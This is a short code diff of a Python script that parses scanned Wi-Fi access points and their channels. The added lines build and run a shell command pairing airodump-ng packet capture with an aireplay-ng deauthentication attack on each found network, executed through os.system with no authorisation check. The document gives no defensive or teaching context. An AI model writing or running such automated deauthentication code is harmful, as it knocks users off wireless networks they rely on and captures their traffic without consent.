@@ -10,8 +10,6 @@ import csv
 import pandas as pd
 
 
-
-
 if os.path.exists('output.txt'):
   os.remove('output.txt')
 
@@ -60,8 +58,19 @@ for item in outBSSID:
         ch = int(outputCSV[filter]["channel"])
         print(item + ": ",ch)
         print("***************4****************************")
+        with open('output2.csv', 'w', newline='') as file:
+            writer = csv.writer(file)
+            writer.writerow([item,ch])
+            dist=5
+            order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interfacemon,item,ch,scan,dist,item,interfacemon)
+            geny = os.system(order)
     else: 
       print(item," : bulunamadi")
+      
+
+      
+      
+
 
 
 
